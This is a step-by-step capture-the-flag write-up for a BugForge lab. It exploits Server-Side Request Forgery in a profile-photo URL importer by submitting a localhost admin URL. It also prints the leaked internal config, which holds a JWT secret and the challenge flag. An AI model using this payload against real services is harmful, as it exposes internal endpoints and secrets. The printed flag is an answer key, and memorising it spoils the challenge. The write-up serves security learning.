# Cafe Club — cafeclub-009 - Can you import some secrets? 

## 1. Open the challenge

Navigate to the running BugForge instance and register/log in:
```
https://lab-1789920186034-rbusss.labs-app.bugforge.io
```
## 2. Navigate to the Profile page

Go to:

`Profile → Edit Profile`

Look for the profile photo/avatar functionality.

There should be an option to import a profile photo from a URL.

## 3. Test the URL importer

Instead of providing an external image URL, enter:
```
http://localhost:3000/admin/config
```
The important observation is that localhost refers to the server running the application, not your own computer.

Click on the `Import` button.

## 4. Capture the request

Open Firefox Developer Tools:

F12 → Network

The browser sends a request similar to:

POST /api/profile/avatar/import

The request contains JSON with the URL you supplied.

The important endpoint is:

/api/profile/avatar/import

The server responds with something similar to:
```json
{
  "message": "Avatar imported successfully",
  "avatar_url": "/uploads/avatars/157c9f04aa445fb9226c41bbd1c2b8fe.txt"
}
```
## 5. Follow the generated avatar URL

The application then requests:
```
GET /uploads/avatars/157c9f04aa445fb9226c41bbd1c2b8fe.txt
```
Open that request in the Network tab and inspect the Response.

You should see:
```json
{
  "service": "cafeclub-admin-api",
  "environment": "production",
  "jwt_secret": "fourthFifth109CheeseKeyLeaf",
  "flag": "bug{gT4ciZwcB5UzKaKX3WLmAlxDuabIfoXX}"
}
```
## 6. Identify the vulnerability

The application accepts an arbitrary URL for avatar importing and makes the request from the server.

We supplied:
`http://localhost:3000/admin/config`

The server therefore accessed an internal service that would not necessarily be directly exposed to an external user.

This demonstrates:

* Server-Side Request Forgery (SSRF)

The fetched internal response was then written to the avatar upload directory and made accessible through the generated /uploads/avatars/... URL.

## 7. Extract the flag

The flag is:
```
bug{gT4ciZwcB5UzKaKX3WLmAlxDuabIfoXX}
```

## Attack flow
```
User
 │
 │ Avatar URL:
 │ http://localhost:3000/admin/config
 ▼
POST /api/profile/avatar/import
 │
 ▼
Cafe Club server
 │
 │ Server-side request
 ▼
http://localhost:3000/admin/config
 │
 ▼
Internal Admin API
 │
 │ Sensitive configuration
 ▼
Response saved as avatar file
 │
 ▼
/uploads/avatars/<generated>.txt
 │
 ▼
User retrieves internal response
```
## Key takeaway

The vulnerable functionality is the URL-based avatar importer. It should validate and restrict destination URLs instead of allowing arbitrary server-side requests, particularly requests to loopback/internal services.